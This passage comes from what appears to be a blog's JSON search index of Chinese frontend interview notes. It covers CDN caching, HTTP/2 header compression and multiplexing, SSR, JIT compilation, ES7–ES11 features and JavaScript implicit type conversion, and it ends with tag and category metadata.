解析服务器会**解析到另外一个域名，这个域名最终指向 CDN 全局负载均衡服务器**，然后智能的挑选一个就近的最佳节点。 缓存系统(命中率&amp;回源率) 命中率: 命中缓存的次数/总请求次数 回源率: 没命中缓存，即从服务器拿数据 减少请求次数资源合并http 请求是需要建立连接的，这个过程是需要时间的，当多个资源有多个请求时，明显的很耗费时间解决方案： 雪碧图 域名分片同个域名浏览器可以有 6-8 个网络连接（tcp 连接），以 Chrome 为例，限制一个域名同时并发 6 个连接解决方案： 多域名 HTTP 缓存HTTP 缓存 压缩资源数据压缩 gzip 与新的 br gzip: 运用广泛br: 由 Chrome 开发的新的压缩算法，性能比 gzip 高由于浏览器兼容问题，运用不广 代码文件压缩 HTML/CSS/JS 中的注释、空格、长变量名等 静态资源 字体图标，去除元数据（图片中的作者，时间，大小等信息），缩小尺寸及分辨率，使用 jpg 或者 webp 格式 头与报文 http1.1 中减少不必要的头 减少 cookie 数据量 HTTP2 协议HTTP2 协议本身就比 HTTP1.1 快上很多! 那么快在哪？ 头部压缩臃肿的请求头（平均测试为 460 字节）是使之变慢的重要原因之一，HTTP2 为此的解决方案： 专门的 HPACK 压缩算法 索引表 霍夫曼编码 索引表： 需要客户端和服务端共同维护，分为一个静态表 Static Table（静态表存放几乎所有常用的头信息键值对），一个动态表 Dynamic Table。 当客户端请求的时候只需要发送表Static Table中的索引值比如: :method=GET 用 2 表示等，并且值会通过霍夫曼编码进行压缩字符 当发送了一个在Static Table中的 User-Agent，索引为 58，但是他的值不在``Static Table中，请求的时候用 58，表示 User-Agent，服务器接收后会将 User-Agent 添加到Dynamic Table，缓存起来 二进制帧在 HTTP1.1 文本字符分割的数据流，导致解析慢且容易出错，解决方案：二进制帧： 帧长度 帧类型 帧标识 链路复用(多路复用) 简单来说： 一个域名只维护一个 TCP，一个 TCP 可以并发多个 HTTP 请求 那么多路复用有什么优点以及怎么在现实体现它的快速呢：假设，有服务端的最大并发 TCP 量为 600，那么在 HTTP1.1 下，一个客户端最大的 TCP 并发为 6 个，那么在最大的并发量下，可接纳最多的用户为 600 / 6 = 100 个，那如果第 101 一个发起请求，那么还要等那 100 用户其中之一的 TCP 完成之后才开始（队头阻塞）。那么在 HTTP2 的多路复用下：一个域名共用一个 TCP，意味着可达到的并发用户量为 600 / 1 = 600 个！与服务端并发量达到一致。并且一个 TCP 可并发多个 HTTP 请求，再利用上述所说二进制分层实现并行请求，任何时候都可以发送请求给服务器解决对队头阻塞问题 如何让数据处理更高效 HTML 语义标签加强 DOM 解析 多使用为元素，减少 JS 多 DOM 的查找遍历 能用 HTML/CSS 实现的效率就不用用 JS 逻辑与展示解耦，避免不必要的 JS 引擎启动（HTML 出现 js 代码） 减少作用域查找和闭包，避免== SSR 服务端渲染（next.js，nuxt.js） SSR 服务端渲染在客户端请求服务器的时候，服务器到数据库种获取数据，并且在服务器种将 vue 等组件，数据等转化为 HTML，服务器再将 HTML 返回给客户端。这个在服务器将组件数据等转为 HTML 的过程就叫服务端渲染要了解 SSR，首先要了解同构的概念。 同构在服务端渲染中，有两种页面渲染方式， 前端服务器通过请求服务器获取数据并组装 HTML 返回给浏览器，浏览器直接解析 HTM 给页面 浏览器在交互过程中，请求新的数据并动态更新渲染页面 这两种有一点不同点，也就是第一种是在服务器将 HTML 返回给客户端，而第二种是在客户端组成 HTML，运行环境不一样那么同构要做的事就是用一套代码兼容这两种情况 同构的条件对于同构的应用来说，必须实现客户端和服务端的路由、模型组件、模型数据的共享。 SSR 图解： 解释性语言和编译性语言编译性语言（C/GO...）,在程序运行之前要经过编译器编译，编译后机器保留机器能读懂的二进制文件，当程序运行的时候直接运行二进制，不需重新编译解释性语言（JS/Python..）,在每次运行时都要经过解释器动态解释和运行 编译器和解释器原理： 如何执行 JSJIT(即时编译 just in time)技术：热点代码会执行编译。 逐行解逐行执行 热点区一次性编译（JIT）字节码需要解释器转换成机器码才能执行 ps: 机器码所需内存比字节码大，但是执行速度快, ES7 Array.prototype.includes() Math.pow() ES8 async/await Object.values() Object.entries() ES9 异步迭代 123for (let i of array) { await doSomething(i);} Promise.finally() Rest/Spread 属性 ES10 flat() flatMap() Object.fromEntries() BigInt ES11 空值处理 ?? 可选链 ? Promise.allSettled Dynamic import 隐式转换js 的隐式转换会发生在运算过程，比如+ - * / == &lt; &gt;;简单类型：一般的情况会将两侧转换会数字再进行运算：比如： 123451 + false; // 11 + Number(false); // 1 + 01 == false;1 == Number(false); // 1 == 0 特殊情况：当 + 号 两个存在字符串，两边会直接当作字符串运算 11 + &quot;1&quot;; // 11 引用类型：会执行ToPrimitive运算，默认执行 valueOf -&gt; toString 转换基本类型运算 123456let a = {};a &gt; false; // falsea.valueOf(); // {}a.toString(); // [object Object]Number(&quot;[obejct Object]&quot;) &gt; false; // NaN &gt; false 浏览器窗口通讯","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/javascript/"}],"tags":[{"name":"个人项目","slug":"个人项目","link":"/tags/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/"},{"name":"架构","slug":"架构","link":"/tags/%E6%9E%B6%E6%9E%84/"},{"name":"知识点","slug":"知识点","link":"/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"name":"笔记","slug":"笔记","link":"/tags/%E7%AC%94%E8%AE%B0/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"}],"categories":[{"name":"浏览器","slug":"浏览器","link":"/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"style","slug":"style","link":"/categories/style/"},{"name":"javascript","slug":"javascript","link":"/categories/javascript/"},{"name":"算法","slug":"算法","link":"/categories/%E7%AE%97%E6%B3%95/"},{"name":"网络","slug":"网络","link":"/categories/%E7%BD%91%E7%BB%9C/"},{"name":"基础知识","slug":"javascript/基础知识","link":"/categories/javascript/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"typescript","slug":"javascript/typescript","link":"/categories/javascript/typescript/"},{"name":"vue","slug":"javascript/vue","link":"/categories/javascript/vue/"},{"name":"abstract tree","slug":"javascript/abstract-tree","link":"/categories/javascript/abstract-tree/"}]}